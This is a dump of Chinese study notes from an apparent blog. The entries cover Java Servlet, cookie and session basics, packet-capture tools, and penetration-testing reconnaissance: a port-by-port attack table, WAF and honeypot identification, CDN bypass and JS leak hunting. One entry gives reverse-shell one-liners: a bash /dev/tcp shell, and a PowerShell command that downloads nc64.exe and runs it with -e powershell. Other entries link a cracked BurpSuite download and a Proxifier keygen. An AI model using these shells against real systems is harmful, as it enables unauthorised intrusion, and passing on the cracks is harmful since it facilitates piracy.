对象的生命周期：  （1）创建：第一次调用 request.getSession 时创建。  （2）销毁：服务器关闭销毁 session 过期手动销毁。\njavapackage zzs.listener;\nimport javax.servlet.ServletContextEvent;\nimport javax.servlet.ServletContextListener;\nimport javax.servlet.annotation.WebListener;\nimport javax.servlet.http.HttpSessionAttributeListener;\nimport javax.servlet.http.HttpSessionEvent;\nimport javax.servlet.http.HttpSessionListener;\nimport javax.servlet.http.HttpSessionBindingEvent;\n \n@WebListener()\npublic class FirstHttpSessionListener implements HttpSessionListener &#123;\n    public FirstHttpSessionListener() &#123;\n    &#125;\n    public void sessionCreated(HttpSessionEvent se) &#123;\n        System.out.println(&quot;session创建id:&quot;+se.getSession().getId());\n    &#125;\n    public void sessionDestroyed(HttpSessionEvent se) &#123;\n        System.out.println(&quot;session销毁&quot;);\n    &#125;\n&#125;ServletRequestListener\n  ServletRequestlistener 监听 ServletRequest 域创建与销毁的监听器 ServletRequestListener  ServletRequest 的生命周期  （1）创建：每一次请求都会创建 request  （2）销毁：请求结束\n","slug":"Java-过滤器","date":"2025-05-17T06:46:19.943Z","categories_index":"Java基础知识","tags_index":"Java基础","author_index":"Hao"},{"id":"9116ce8cd7513e24b93bb0c7493010d2","title":"JavaEE应用-Servlet","content":"JavaEE应用-ServletJavaEE 基础一：Servlet 实现继承抽象类 HttpServlet 的重写部分方法（常用）\n添加注解 @WebServlet(“&#x2F;LoginServlet”)\n\n\n\n\n\n\n\n\n\nservlet3.0 引入了 @WebServlet,@WebFilter 等注解，可以代替在 web.xml 中通过  等标签进行配置 , 从而可以摆脱掉 web.xml，@WebServlet(“&#x2F;LoginServlet”)\njava    创建 Indexservlet 的类\n        package com.example.demo2;\n        \n        import javax.servlet.ServletException;\n        import javax.servlet.annotation.WebServlet;\n        import javax.servlet.http.HttpServlet;\n        import javax.servlet.http.HttpServletRequest;\n        import javax.servlet.http.HttpServletResponse;\n        import java.io.IOException;\n        \n        /**\n        * servlet实现\n        * 1，创建Class类\n        * 2，继承HttpServlet类\n        * 3，重写Service()方法(Service方法在Servelt类被访问时自动调用，作用：接受请求，响应结果)\n        * 4，在Servlet中添加注解，设置资源对位访问路径，浏览器通过访问路径，访问到Servlet类\n        */\n        \n        @WebServlet(&quot;/ser01&quot;) //添加注解，访问路径\n        public class Indexservlet extends HttpServlet &#123;  \n            @Override\n            protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n                System.out.println(&quot;Hello,Indexservlet&quot;);  //输出在控制台\n                //响应数据\n                resp.getWriter().write(&quot;Hello,Index&quot;);  //输出到客户端\n            &#125;\n        &#125;二：Servlet 的工作流程与生命周期Servlet 的生命周期可以分为四个阶段，即装载类及创建实例阶段、初始化阶段、服务阶段和实例销毁阶段。\n\n1、初始化阶段  调用 init () 方法\n2、响应客户请求阶段。调用 service () 方法，由 service () 方法根据提交的方式选择执行 doGet () 或者 doPost () 方法\n3、终止阶段　　调用 destroy () 方法\n\n工作流程：\n\n通过请求头获知浏览器访问的是哪个主机\n在通过请求行获取访问的是哪个 web 应用\n再通过请求行中的请求路径获知访问的是哪个资源\n通过获取的资源路径在配置中匹配到真实路径\n服务器会创建 servlet 对象，（如果第一次访问时，创建 - servlet 实例，并调用 init 方法进行初始化操作）\n调用 service（request，response）方法来处理请求和响应的操作\n调用 service 完毕后返回服务器 由服务器将 response 缓冲区的数据取出\n\n三，HttpServleRequest 对象 作用：主要用来接受客户端发送过来的请求信息。例如：请求的参数，发送的头信息等都属于客户端发来的信息，service () 方法中的形参接受的是 HttpServletRequest 接口的实例化对象，表示对象主要运用在 HTTP 协议上，该对象有 Tomcat 封装好传递过来\n接受请求：\n常用方法：\ngetRequestURL ()：获取客户端发出请求时的完整 URL\ngetRequestURL ()：获取请求行中的资源名称部分（项目名称开始）\ngetQueryString ()：获取请求行中的参数部分\ngetMethod ()：获取客户端的请求方式\ngetProtocol ()：获取 HTTP 版本号\ngetContextPath ()：获取 webapp 名字（站点名）\njava    String url = req.getRequestURL().toString();\n    System.out.println(&quot;获取客户端请求的完整URL &quot;+url);\n    //获取客户端请求的完整URL （从http 开始，到？前面结束）\n    String uri = req.getRequestURI();\n    System.out.println(&quot;获取客户端请求的完整URi &quot;+uri);\n    //获取请求中的参数部分\n    String queryString=req.getQueryString();\n    System.out.println(&quot;获取请求中的参数部分:&quot;+queryString);\n    //获取客户端的请求方式\n    String method = req.getMethod();\n    System.out.println(&quot;获取客户端的请求方式:&quot;+method);\n    //获取HTTP版本号\n    String protocol=req.getProtocol();\n    System.out.println(&quot;获取HTTP版本号:&quot;+protocol);\n    //获取webapp名字（站点名）\n    String webapp =req.getContextPath();\n    System.out.println(&quot;获取webapp名字（站点名）:&quot;+webapp);java        /**\n                *获取请求参数\n                *   1.通过参数名获取参数值， 返回字符串\n                *   req.getParameter(&quot;参数名&quot;);\n                *      参数名：\n                *         1.表达元素name属性值\n                *         2.ajax的data属性值的键\n                *         3.超链接参数的键\n                *   2.通过参数名获取所有的参数值，返回数组\n                *\n                **   */\n                //获取用户名\n                String uname = req.getParameter(&quot;unmae&quot;);\n                String upwd = req.getParameter(&quot;upwd&quot;);\n                System.out.println(&quot;姓名：&quot;+uname+&quot;密码&quot;+upwd);\n        \n                //通过参数名获取所有的参数值，返回数组\n                String[] hobby =req.getParameterValues(&quot;hobby&quot;);\n                System.out.println(hobby.length);请求转发：\n请求转发，是一种服务器的行为，当客户端请求达到后，服务器进行准发，此时会将请求对象进行保存，地址栏中的 URL 地址不会改变，得到响应后，服务端在响应发送给客户端，从始至终只有一个请求发出。\njava    request.getRequestDispatcher(url).forward(request.response);Request 作用域\n通过该对象可以在一个请求中传递数据，作用范围：在一次请求中有效，即服务跳转有效\njava        //设置域对象内容\n        request.setAttribute(String name,String value);\n        //获取域对象内容\n        request.getAttrbute(String name);\n        //删除域对象内容\n        request.removeAttrbute(String name);request 域对象中的数据在一次请求中有效，则经过请求转发，request 域中的数据依然存在，则在请求转发的过程中可以通过 request 来传输 &#x2F; 共享数据\n响应数据接收到客户端请求后，可以通过 HttpServletResponse 对象直接进行响应，响应时需要获取输出流。有两种形式:getWriter() 获取字符流 (只能响应回字符)getOutputStream() 获取字节流 (能响应一切数据)\n重定向\n重定向是一种服务器指导，客户端的行为。客户端发出第一个请求，被服务器接收处理后，服务器会进行响应，在响应的同时，服务器会给客户端一个新的地址，当客户端接收到响应后，会立刻、马上、自动根据服务器给的新地址发起二个请求，服务器接收请求并作出响应，重定向完成。\ntxtresp.sendRedirect(&quot;url&quot;);请求转发与重定向的区别\n\n\n请求转发的地址栏不发生改变，重定向的地址会被改变\n\n\n\n请求转发是服务端跳转，重定向是客户端跳转\n\n\n\n请求转发是一次请求，重定向是两次请求\n\n\n\n请求转发是 request 作用域可以共享，重定向是不可以共享\n\n\n\n请求转发的地址是跳转到当前项目的资源，重定向可  跳转到任意资源\n\n\n\njava        package com.example.demo2;\n        \n        import javax.servlet.ServletException;\n        import javax.servlet.annotation.WebServlet;\n        import javax.servlet.http.HttpServlet;\n        import javax.servlet.http.HttpServletRequest;\n        import javax.servlet.http.HttpServletResponse;\n        import java.io.IOException;\n        \n        @WebServlet(&quot;/ser03&quot;)\n        public class servlet03 extends HttpServlet&#123;\n                @Override\n                protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n                    System.out.println(&quot;yes.....&quot;);\n        \n                    String name = req.getParameter(&quot;name&quot;);\n                    String pwd = req.getParameter(&quot;pwd&quot;);\n        \n                            System.out.println(&quot;servlet...&quot;);\n        \n                            //请求转发(服务端)\n        //        req.getRequestDispatcher(&quot;index.jsp&quot;).forward(req,resp);\n        \n                            //重定向 跳转到首页（服务端）\n                            resp.sendRedirect(&quot;http://www.baidu.com&quot;);\n                            //跳转到百度\n                &#125;\n        &#125;Cookie 对象通过 new Cookie (“key” “value”); 来创建一个 Cookie 对象，要想将 Cookie 随响应发送到客户端，需要先添加到 response 对象中，response.addCookie (cookie); 此时该 cookie 对象则随着响应发送至了客户端。在浏览器上可以看见\ncookie 获取\njava    Cookie cookie =new Cookie(&quot;uname&quot;,&quot;admin&quot;);\n            \n    //响应cookie对象\n    resp.addCookie(cookie);\n\n\n\n    package com.shsxt.servlet.Cookie;\n    \n    import javax.servlet.ServletException;\n    import javax.servlet.annotation.WebServlet;\n    import javax.servlet.http.Cookie;\n    import javax.servlet.http.HttpServlet;\n    import javax.servlet.http.HttpServletRequest;\n    import javax.servlet.http.HttpServletResponse;\n    import java.io.IOException;\n    \n    /**\n    * Cookie\n    *     是浏览器技术\n    * Cookie对象的创建与发送\n    * */\n    \n    @WebServlet(&quot;/cook01&quot;)\n    public class Cookie01 extends HttpServlet &#123;\n        @Override\n        protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n    \n            //得到Cookie对象\n    \n            Cookie cookie =new Cookie(&quot;uname&quot;,&quot;admin&quot;);\n    \n            //响应cookie对象\n            resp.addCookie(cookie);\n        &#125;\n    &#125;\nCookie 的路径\ntxtCookie 的 setPath 设置 cookie 的路径，这个路径直接决定服务器的请求是否会从浏览器中加载某些 cookie。\n\n        // 1.当前服务器下，任务项目的任意资源，都可获取Cookie对象\n        Cookie cookie01=new Cookie(&quot;aa&quot;,&quot;AA&quot;);\n        cookie01.setPath(&quot;/&quot;);\n        resp.addCookie(cookie01);\n\n//      2.在当前项目下，可以获取cookie对象（默认）\n        Cookie cookie02=new Cookie(&quot;bb&quot;,&quot;BB&quot;);\n        cookie02.setPath(&quot;/zhongsheng&quot;);\n        resp.addCookie(cookie02);\n//        3.在指定项目下，可获取cookie对象（指定项目站点名：/s05）\n        Cookie cookie03=new Cookie(&quot;cc&quot;,&quot;CC&quot;);\n        cookie03.setPath(&quot;/ser05&quot;);\n        resp.addCookie(cookie03);\n//        4.在指定项目的指定资源下，以获取cookie对象\n        Cookie cookie04=new Cookie(&quot;dd&quot;,&quot;DD&quot;);\n        cookie04.setPath(&quot;/zhongsheng/test&quot;);\n        resp.addCookie(cookie04);Cookie 的 setPath 设置 cookie 的路径，这个路径直接决定服务器的请求是否会从浏览器中加载某些 cookie。*当前项目：站点名为：&#x2F;zhongsheng当前服务域名为：localhost:8080设置路径：setpath (), 默认当前项目的站点名setPath(“&#x2F;zhongsheng”)*\n\n\n当前服务器下，任务项目的任意资源，都可获取 Cookie 对象\n\n\nserpath(“&#x2F;”);\n\n在当前项目下，可以获取 cookie 对象（默认）\n\n\nsetPath（“&#x2F;zhongsheng”）\n\n在指定项目下，可获取 cookie 对象（指定项目站点名：&#x2F;s05）\n\n\nsetPath（“&#x2F;s05”）\n\n在指定项目的指定资源下，以获取 cookie 对象setPath（“&#x2F;zhongsheng&#x2F;ser12”）;\n\n\n\nHttpSesion 对象\n对于服务器而言，每一个连接到它的客户端都是一个 session，servlet 容器使用此接口创建 HTTP 客户端和 HTTP 服务器之间的会话。会话将保留指定的时间段，跨多个连接或来自用户的页面请求。一个会话通常对应于一个用户，该用户可能多次访问一个站点。可以通过此接口查看和操作有关某个会话的信息，比如会话标识符、创建时间和最后一次访问时间。在整个 session 中，最重要的就是属性的操作。\nsession 无论客户端还是服务器端都可以感知到，若重新打开一个新的浏览器，则无法取得之前设置的 session，因为每一个 session 只保存在当前的浏览器当中，并在相关的页面取得。\nSession 的作用就是为了标识一次会话，或者说确认一个用户；并且在一次会话（一个用户的多次请求）期间共享数据。我们可以通过 request.getSession () 方法，来获取当前会话的 session 对象。\ntxt//创建获取Session\nHttpSession session =req.getSession();\n//设置sessiony标识符 JSESSIONID\nSession 既然是为了标识一次会话，那么此次会话就应该有一个唯一的标志，这个标志就是 sessionld。\n每当一次请求到达服务器，如果开启了会话 (访问了 session)，服务器第一步会查看是否从客户端回传一个名为 JSESSIONID 的 cookie，如果没有则认为这是一次新的会话，会创建一个新的 session 对象，并用唯一的 sessionld 为此次会话做一个标志。如果有 JESSIONID 这个 cookie 回传，服务器则会根据 JSESSIONID 这个值去查看是否含有 id 为 JSESSION 值的 session 对象，如果没有则认为是一个新的会话，重新创建一个新的 session 对象，并标志此次会话；如果找到了相应的 session 对象，则认为是之前标志过的一次会话共享。\n这里提到一个叫做 JSESSIONID 的 cookie，这是一个比较特殊的 cookie，当用户请求服务器时，如果访问了 session，则服务器会创建一个名为 JSESSIONID，值为获取到的 session (无论是获取到的还是新创建的) 的 sessionld 的 cookie 对象，并添加到 response 对象中，响应给客户端，有效时间为关闭浏览器。\n所以 Session 的底层依赖 Cookie 来实现。\ntxtpackage com.shsxt.servlet.Session;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\nimport java.io.IOException;\n\n/**\n* Session的作用域\n*\n*    再一次会话中有效\n*    通过setAttribute(name , value)方法向域对象中添加数据\n*    通过getAttribute(name)从域对象中获取数据\n*    通过removeArribute（name）从域对象移除数据\n*\n*    request作用域\n*       知在一次请求有效\n*       只在请求转发跳转有效\n*    session作用域：\n*        在一次会话中有效，会话中包含多次请求\n*        在请求转发与重定向跳转后都有效\n*        \n**/\n\n@WebServlet(&quot;/ses02&quot;)\npublic class Session02 extends HttpServlet &#123;\n    @Override\n    protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n\n        //创建获取Session\n        HttpSession session =req.getSession();\n        System.out.println(&quot;session02&quot;+session.getId());\n\n        //request作用域\n        req.setAttribute(&quot;requestMsg&quot;,&quot;request的作用域&quot;);\n\n        //session作用域\n        session.setAttribute(&quot;sessionMsg&quot;,&quot;session的作用域&quot;);\n\n        //请求转发\n//        req.getRequestDispatcher(&quot;index.jsp&quot;).forward(req,resp);\n        //重定向\n        resp.sendRedirect(&quot;index.jsp&quot;);\n\n\n    &#125;\n&#125;","slug":"JavaEE应用-Servlet","date":"2025-05-16T15:14:11.789Z","categories_index":"Java基础知识","tags_index":"Java基础","author_index":"Hao"},{"id":"debbc591069b02b5cd9e83564e08a4e5","title":"抓包工具","content":"抓包工具BurpSuite 破解版\nhttps://pan.baidu.com/s/1yUcTEeJVETKjsw3RQq76vw?pwd=smar\n提取码: smar\n安装 JAVA 的环境，剩下步骤百度搜索即可完成\nWireshark\nhttps://www.wireshark.org\nCharles\nhttps://www.charlesproxy.com/download\nFidder\nhttps://www.telerik.com/fiddler\nProxifier\nhttps://proxifiter.com\n破解：https://github.com/y9nhjy/Proxifier-Keygen\n\none-fox集成工具箱等\n","slug":"抓包工具","date":"2025-05-16T15:10:32.952Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"},{"id":"6f3ffbe16670f56708a213e2b17439a8","title":"基础知识-反弹shell","content":"基础知识-反弹shell常见渗透命令：\nhttps://blog.csdn.net/weixin_43303273/article/details/83029138\n命令生成：\nhttps://forum.ywhack.com/bountytips.php?download\nLinux：wget curl python ruby perl java 等\nWindows：PowerShell Certutil Bitsadmin msiexec mshta rundll32 等\n反弹 shell 命令：\nhttps://forum.ywhack.com/shell.php\n常见的：linux\nshellnc -lvnp 443    //监听443端口\n\n/bin/bash -i &gt;&amp; /dev/tcp/ip/443 0&gt;&amp;1      //linux\nWindows:whindows\nshellnc64.exe：https://github.com/vinsworldcom/NetCat64/releases\n\npowershell -c wget ip/nc64.exe -outfile \\\\programdata\\\\nc64.exe //通过漏洞上传nc64.exe\n\\\\programdata\\\\nc64.exe -e powershell ip 443","slug":"基础知识-反弹shell","date":"2025-05-16T15:06:21.704Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"},{"id":"736b272bc4323f631971065b45670c5f","title":"信息收集-3","content":"信息收集-3APP 信息收集\n名称获取 APP 信息（爱企查 &#x2F; 小蓝本 &#x2F; 七麦 &#x2F; 点点）\n1、爱企查知识产权\n2、七麦 &amp; 点点查名称\nhttps://www.xiaolanben.com\nhttps://aiqicha.baidu.com\nhttps://www.qimai.cn\nhttps://app.diandian.com\n通过获取 App 配置、数据包，去获取 url、api、osskey、js 等敏感信息。\n1、资产信息 - IP 域名 网站 - 转到对应 Web 测试 接口测试 服务测试\n2、泄露信息 - 配置 key 资源文件 – key（osskey 利用，邮件配置等）\n3、代码信息 - java 代码安全问题 - 逆向相关\nAPP 中收集资产\n1、抓包 - 动态表现\n2、提取 - 静态表现 &amp; 动态调试\n3、搜索 - 静态表现\n1、抓包抓表现出来的数据\n优点：没有误报\n缺点：无法做到完整\n2、反编译从源码中提取数据\n优点：数据较为完整\n缺点：有很多无用的资产\n3、动态调试从表现中提取数据\n优点：没有误报，解决不能抓包不能代理等情况\n优点；搞逆向的人能看到实时的 app 调用链等\n缺点：无法做到完整\n例子：某 APP 打开无数据包，登录有数据包（反编译后未找到目标资产，抓包抓到了）\n原因：那个登录界面是 APP 打包的资源，并没有对外发送数据\n静态分析：\nAppInfoScanner：\n该产品适用于以 HW 行动 &#x2F; 红队 &#x2F; 渗透测试团队为场景的移动端（Android、iOS、WEB、H5、静态网站）信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态 WEB 站点中关键的资产信息并提供基本的信息输出，如：标题、域名、CDN、指纹信息、状态信息等。\nhttps://github.com/kelvinBen/AppInfoScanner\nAndroid 相关基本操作：\n对本地 APK 文件进行扫描\ntxtpython app.py android -i &lt;Your apk file&gt;  \n例：\npython app.py android -i C:\\Users\\Administrator\\Desktop\\Demo.apkiOS 相关基本操作：对本地 IPA 文件进行扫描    python app.py ios -i 例:    python app.py ios -i “C:\\Users\\Administrator\\Desktop\\Demo.ipa” \nWeb 相关基本操作：对本地 WEB 站点进行扫描    python app.py web -i 例:    python app.py web -i “C:\\Users\\Administrator\\Desktop\\Demo.html” \n移动安全框架（MobSF）\n移动安全框架（MobSF）是一个自动化、一体化的移动应用程序（Android&#x2F;iOS&#x2F;Windows）渗透测试、恶意软件分析和安全评估框架，能够执行静态和动态分析。MobSF 支持移动应用程序二进制文件（APK、XAPK、IPA 和 APPX）以及压缩的源代码，并提供 REST API，以便与 CI&#x2F;CD 或 DevSecOps 管道无缝集成。动态分析器帮助您执行运行时安全性评估和交互式检测测试。\nhttps://github.com/MobSF/Mobile-Security-Framework-MobSF\n所需环境：\n本篇以 Windows 为例\n1、安装 Git（示例版本 Git 2.35.1）\n2、安装 Python 3.8-3.9（示例版本 Python 3.8.10）\n3、安装 JDK 8+（示例版本 JDK 1.8.0_172）\n4、安装 Microsoft Visual C++ Build Tools\n5、安装 OpenSSL（non-light）\n6、安装 wkhtmltopdf，并将包含 wkhtmltopdf 的二进制文件路径添加到\n环境变量 PATH 里\n运行： run.bat 127.0.0.1:8000\n动态抓包：\n使用抓包工具 Burp 等\n动态调试：\nMobsf 工具中的动态调试 + 模拟器\n","slug":"信息收集-3","date":"2025-05-16T14:31:55.601Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"},{"id":"56857bf9b8c05cf6ebfcec9910c5d693","title":"信息收集-2","content":"信息收集-2常见端口：\n\n\n\n端口\n服务\n渗透用途\n\n\n\ntcp 20,21\nFTP\n允许匿名的上传下载，爆破，嗅探，win 提权，远程执行 (proftpd1.3.5), 各类后门 (proftpd,vsftp 2.3.4)\n\n\ntcp 22\nSSH\n可根据已搜集到的信息尝试爆破，v1 版本可中间人，ssh 隧道及内网代理转发，文件传输等等\n\n\ntcp 23\nTelnet\n爆破，嗅探，一般常用于路由，交换登陆，可尝试弱口令\n\n\ntcp 25\nSMTP\n邮件伪造，vrfy&#x2F;expn 查询邮件用户信息，可使用 smtp-user enum 工具来自动跑\n\n\ntcp&#x2F;udp 53\nDNS\n允许区域传送，dns 劫持，缓存投毒，欺骗以及各种基于 dns 隧道的远控\n\n\ntcp&#x2F;udp 69\nTFTP\n尝试下载目标及其的各类重要配置文件\n\n\ntcp 80-89,443,8440-8450,8080-8089\n各种常用的 Web 服务端口\n可尝试经典的 topn,vpn,owa,webmail, 目标 oa, 各类 Java 控制台，各类服务器 Web 管理面板，各类 Web 中间件漏洞利用，各类 Web 框架漏洞利用等等……\n\n\ntcp 110\nPOP3\n可尝试爆破，嗅探\n\n\ntcp 111,2049\nNFS\n权限配置不当\n\n\ntcp 137,139,445\nSamba\n可尝试爆破以及 smb 自身的各种远程执行类漏洞利用，如，ms08-067,ms17-010, 嗅探等……\n\n\ntcp 143\nIMAP\n可尝试爆破\n\n\nudp 161\nSNMP\n爆破默认团队字符串，搜集目标内网信息\n\n\ntcp 389\nLDAP\nldap 注入，允许匿名访问，弱口令\n\n\ntcp 512,513,514\nLinux rexec\n可爆破，rlogin 登陆\n\n\ntcp 873\nRsync\n匿名访问，文件上传\n\n\ntcp 1194\nOpenVPN\n想办法钓 VPN 账号，进内网\n\n\ntcp 1352\nLotus\n弱口令，信息泄漏，爆破\n\n\ntcp 1433\nSQL Server\n注入，提权，sa 弱口令，爆破\n\n\ntcp 1521\nOracle\ntns 爆破，注入，弹 shell\n\n\ntcp 1500\nISPmanager\n弱口令\n\n\ntcp 1723\nPPTP\n爆破，想办法钓 VPN 账号，进内网\n\n\ntcp 2082,2083\ncPanel\n弱口令\n\n\ntcp 2181\nZooKeeper\n未授权访问\n\n\ntcp 2601,2604\nZebra\n默认密码 zerbra\n\n\ntcp 3128\nSquid\n弱口令\n\n\ntcp 3312,3311\nkangle\n弱口令\n\n\ntcp 3306\nMySQL\n注入，提权，爆破\n\n\ntcp 3389\nWindows rdp\nshift 后门 [需要 03 以下的系统], 爆破，ms12-020\n\n\ntcp 3690\nSVN\nsvn 泄露，未授权访问\n\n\ntcp 4848\nGlassFish\n弱口令\n\n\ntcp 5000\nSybase&#x2F;DB2\n爆破，注入\n\n\ntcp 5432\nPostgreSQL\n爆破，注入，弱口令\n\n\ntcp 5900,5901,5\nVNC\n弱口令爆破\n\n\ntcp 5984\nCouchDB\n未授权导致的任意指令执行\n\n\ntcp 6379\nRedis\n可尝试未授权访问，弱口令爆破\n\n\ntcp 7001,7002\nWebLogic\nJava 反序列化，弱口令\n\n\ntcp 8000\nAjenti\n弱口令\n\n\ntcp 8009\ntomcat Ajp\nTomcat-Ajp 协议漏洞\n\n\ntcp 8443\nPlesk\n弱口令\n\n\ntcp 8069\nZabbix\n远程执行，SQL 注入\n\n\ntcp 8080-8089\nJenkins,JBoss\n反序列化，控制台弱口令\n\n\ntcp 9080-9081,9090\nWebSphere\nJava 反序列化 &#x2F; 弱口令\n\n\ntcp 9200,9300\nElasticSearch\n远程执行\n\n\ntcp 11211\nMemcached\n未授权访问\n\n\ntcp 27017,27018\nMongoDB\n爆破，未授权访问\n\n\ntcp 50070,50030\nHadoop\n默认端口未授权访问\n\n\n端口扫描：Nmap、Masscan、网络空间\nhttps://github.com/robertdavidgraham/masscan\nwaf:\n云 WAF：百度安全宝、阿里云盾、长亭雷池，华为云，亚马逊云等\n硬件 WAF：绿盟、安恒、深信服、知道创宇等公司商业产品\n软件 WAF：宝塔，安全狗、D 盾等\n代码级 WAF：自己写的 waf 规则，防止出现注入等，一般是在代码里面写死的\n遇到云 WAF，硬件 WAF 基本很难绕过，能绕过也没有什么可利用的东西\n蜜罐：\n低交互式蜜罐 ：通常是指与操作系统交互程度较低的蜜罐系统，仅开放一些简单的服务或端口，用来检测扫描和连接，这种容易被识别。\n中交互式蜜罐 ：介于低交互式和高交互式之间，能够模拟操作系统更多的服务，让攻击者看起来更像一个真实的业务，从而对它发动攻击，这样蜜罐就能获取到更多有价值的信息。\n高交互式 ：指的是与操作系统交互很高的蜜罐，它会提供一个更真实的环境，这样更容易吸引入侵者，有利于掌握新的攻击手法和类型，但同样也会存在隐患，会对真实网络造成攻击。\n原理：伪装与仿真：蜜罐模仿真实系统的服务和响应，让攻击者信以为真。\n监控与日志：系统详尽记录所有与蜜罐的交互，包括网络包、系统日志、命令行操作等。\n数据分析：利用自动化工具和人工分析来解析收集的数据，识别攻击模式和趋势。\n1，国外蜜罐产品\n一些常见的蜜罐产品包括：\n\nCowrie: Cowrie 是一个基于 Python 的 SSH&#x2F;Telnet 蜜罐，旨在模拟 SSH 和 Telnet 服务，并记录攻击者的行为。\nHoneyd: Honeyd 是一个虚拟蜜罐框架，可以模拟各种网络服务，并产生大量的虚假网络流量，以吸引攻击者。\nKippo: Kippo 是一个交互式 SSH 蜜罐，可以模拟 SSH 服务，并记录攻击者的输入和行为，以便分析和防御。\nGlastopf: Glastopf 是一个 Web 应用蜜罐，可以模拟各种 Web 服务，并记录攻击者的 Web 请求和攻击行为。\nThug: Thug 是一个低交互式蜜罐，可以模拟 Web 浏览器，并记录恶意网站的行为和攻击代码。\nDTK (Damn Vulnerable Linux)：一个故意设计漏洞的 Linux 发行版，常用于蜜罐部署和安全教育。\nConpot：专注于工业控制系统的蜜罐，模拟 SCADA 系统来检测针对工控网络的攻击。\n\n2，国内蜜罐产品\n\n知道创宇 - 创宇蜜罐：这是知道创宇公司推出的一款蜜罐产品，专门设计用于模拟真实环境，吸引并监测攻击者的行为，提供攻击预警与行为分析功能。\n长亭科技 - 谛听：长亭科技开发的谛听蜜罐系统，同样着眼于高仿真度和高交互性，能够有效吸引攻击者并收集其攻击手法与意图。\n\n基本识别方法：\n1.用 Nmap 等 Scan 工具，同一个机器同时开放很多 Port 的。\n2.因为很多蜜罐都设置在相同或临近的网段。所以，同一个网段（e.g. ／24），很多机器都开放相同的 Port，回应相似的 Response。\n3.去 Shodan／Censys 查\nCDN：\n\n传统访问：用户访问域名–&gt; 解析服务器 IP–&gt; 访问目标主机\n\n普通 CDN：用户访问域名–&gt;CDN 节点–&gt; 真实服务器 IP–&gt; 访问目标主机\n\n带 WAF 的 CDN：用户访问域名–&gt;CDN 节点（WAF）–&gt; 真实服务器 IP–&gt; 访问目标主机\n\n\n#CDN 配置及绕过：\n配置 1：加速域名 - 需要启用加速的域名\n配置 2：加速区域 - 需要启用加速的地区\n配置 3：加速类型 - 需要启用加速的资源\n#CDN 的判定：\n超级 Ping：https://17ce.com/\n超级 Ping：https://ping.chinaz.com/\n各地 ping（出现多个 ip 存在 CDN）\n后置：绑定 HOSTS 访问解析\nCDN 绕过：\n1，子域名访问真实 ip（与加速配置有关），国外访问（加速区域没有配置全球访问）\n2，漏洞利用，比如 RCE，SSRF\n3，邮件系统：让它主动给你发送邮件\n部署架构的邮件服务系统主动向用户发送邮件的话，邮件头部的源码会包含邮件服务系统的真实 ip\n对方使用第三方邮件发送就不存在 ip 比如：@126.com，@qq.com 等\n常见的邮箱出发点：\n1，RSS 订阅\n2，邮箱注册，激活处\n3，邮箱找回密码处\n4，产品更新的邮件推送\n5，某业务执行后发送的邮件通知\n6，员工邮箱，邮箱管理系统平台等入口的忘记密码\n你给未知的邮箱发送：（需要自己的邮箱服务器不能第三方）\n网站查询：\nhttps://get-site-ip.com/(参考)\n","slug":"信息收集-2","date":"2025-05-16T13:42:16.964Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"},{"id":"7ffaad9414de91782db2e38f54fe1af8","title":"信息收集-1","content":"信息收集-1CMS 指纹识别在线 cms 指纹识别：http://whatweb.bugscaner.com/look/\nWappalyzer：https://github.com/AliasIO/wappalyzer\nTideFinger 潮汐：http://finger.tidesec.net/\n云悉指纹：https://www.yunsee.cn/\nWhatWeb：GitHub – urbanadventurer&#x2F;WhatWeb: Next generation web scanner\n数字观星 Finger-P：https://fp.shuziguanxing.com/#/\n后端 - 闭源 - 配置不当 - 源码泄漏参考：https://www.secpulse.com/archives/124398.html\n备份：敏感目录文件扫描\nCVS：https://github.com/kost/dvcs-ripper\nGIT：https://github.com/lijiejie/GitHack\nSVN：https://github.com/callmefeifei/SvnHack\nDS_Store：https://github.com/lijiejie/ds_store_exp\ncomposer.json：php 中，composer.json, 它描述了组件的信息: 名称 , 描述 , 关键词 , 作者 , GitHub 仓库地址…\ngit 源码泄露，svn 源码泄露，hg 源码泄漏，网站备份压缩文件，WEB-INF&#x2F;web.xml 泄露，DS_Store 文件泄露，SWP 文件泄露，CVS 泄露，Bzr 泄露，GitHub 源码泄漏\n有些小公司，或者黑色产业，会使用网上的源码进行搭建自己的 app 等，对网上的源码进行比对\n站长服务中心 — 网络维护服务市场，身边的技术服务顾问 – 互站网\n什么是 JS 渗透测试？在 Javascript 中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞\nJS 开发的 WEB 应用和 PHP，JAVA,NET 等区别在于即没有源代码，也可以通过浏览器的\n查看源代码获取真实的点。获取 URL，获取 JS 敏感信息，获取代码传参等，所以相当于\nJS 开发的 WEB 应用属于白盒测试（默认有源码参考），一般会在 JS 中寻找更多的 URL\n地址，在 JS 代码逻辑（加密算法，APIkey 配置，验证逻辑等）进行后期安全测试。\nJS 安全问题源码泄漏\n未授权访问 &#x3D; JS 里面分析更多的 URL 访问确定接口路径\n敏感 key 泄漏 &#x3D; JS 文件中可能配置了接口信息（云应用，短信，邮件，数据库等）\nAPI 接口安全 &#x3D;（代码中加密提交参数传递，更多的 URL 路径）\n手工分析模式：1，先用 network 2，用 wappalyzer 查看框架 3，只看 js（vue.js) 4,看 admin&#x2F;login 等这种 5,ctrl + shift +f 搜索获取价值信息。\n快速获取价值信息src&#x3D;\npath&#x3D;\nmethod&#x3D;”get”、method&#x3D;”post”\nhttp.get(“、http.post(“\n$.ajax\nhttp://service.httpget\nhttp://service.httppost\nJS 前端架构 — 半自动 Burp官方插件：JS Link Finder &amp; JS Miner\n第三方插件：HaE &amp; Unexpected_information\nUnexpected_information：https://github.com/ScriptKid-Beta/Unexpected_information\n用来标记请求包中的一些敏感信息、JS 接口和一些特殊字段，防止我们疏忽了一些数据包，使用它可能会有意外的收获信息。\nHaE：https://github.com/gh0stkey/HaE\n基于 BurpSuite 插件 JavaAPI 